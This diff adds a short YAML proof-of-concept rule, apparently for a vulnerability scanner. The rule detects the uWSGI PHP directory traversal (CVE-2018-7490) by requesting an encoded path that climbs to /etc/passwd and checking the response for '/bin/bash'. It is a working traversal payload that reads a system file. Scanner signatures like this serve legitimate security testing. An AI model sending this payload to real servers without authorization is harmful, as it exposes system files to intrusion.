@@ -1,0 +1,11 @@
+name: poc-yaml-uWSGI-PHP-dirtraversal
+rules:
+  - method: GET
+    path: /..%2f..%2f..%2f..%2f..%2fetc/passwd
+    expression: |
+      status == 200 && body.bcontains(b'/bin/bash')
+detail:
+  description: uwsgi_php_dir_traversal
+  vulnpath: /..%2f..%2f..%2f..%2f..%2fetc/passwd
+  author: w3bdoge
+  vulhub: https://vulhub.org/#/environments/uwsgi/CVE-2018-7490/
